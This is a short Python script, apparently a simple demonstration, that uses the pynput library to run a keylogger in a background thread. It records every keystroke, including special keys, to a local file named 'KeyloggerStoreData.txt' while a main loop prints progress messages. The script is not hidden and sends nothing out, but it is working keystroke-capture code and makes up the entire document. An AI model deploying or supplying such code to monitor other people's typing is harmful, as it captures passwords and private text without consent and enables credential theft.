from pynput import keyboard
import threading
import time

# File to store keystrokes
log_file = "KeyloggerStoreData.txt"

def on_press(key):
    try:
        # Normal characters
        key_text = key.char
    except AttributeError:
        # Special keys (ENTER, SHIFT, CTRL, etc.)
        key_text = f"[{key}]"

    print(f"[Listener] Key pressed: {key_text}")

    # Append pressed key to file
    with open(log_file, "a") as file:   # <--- "a" means append, so old data is not deleted
        file.write(str(key_text) + "\n")


def start_listener():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()


# Start listener in background
listener_thread = threading.Thread(target=start_listener, daemon=True)
listener_thread.start()


# Main program doing something else
for i in range(10):
    print(f"[Main Program] Working... {i}")
    time.sleep(2)

print("Program finished.")
